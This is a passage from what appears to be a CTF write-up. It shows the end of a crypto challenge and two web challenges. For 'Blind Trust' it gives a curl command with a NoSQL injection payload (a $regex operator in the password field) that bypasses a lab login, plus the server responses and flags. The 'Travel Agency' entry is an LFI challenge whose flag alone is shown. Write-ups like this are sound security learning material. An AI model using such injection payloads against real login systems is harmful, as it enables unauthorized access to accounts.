The Encrypted flag is b'QS3kRaEFSL8/DgxTHUMDReK2GPiUTMDe1X7oXAtjYWqVgTfJNfPXbKr9QVk8zMUc4koyiRvnZyR/c5W/l4LIEg=='
The ciphertext of "1" is b'sau7HgT+eyJnGGec9gybxg=='
```

## Web

### Blind Trust

it’s pretty clear it’s a `nosql injection` vulnerability.

```bash
curl -s -X POST http://3.108.219.232:54907/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": { "$regex": "^" }}'
{"success":true,"message":"Welcome admin! Not so Easy... Where's the password?","flag":"{Login with the correct password to get the flag}"}
┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CTF/Payatu/Web]
└─$ curl -s -X POST http://3.108.219.232:54907/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "s3cr3tPass"}'
{"success":true,"message":"Welcome admin!","flag":"PAYATU{NoSQLi_Success}"}
```

### Travel Agency

basic `LFI`.

```bash
PAYATU{BANDIT_1s_B4ND1T_RFI}
```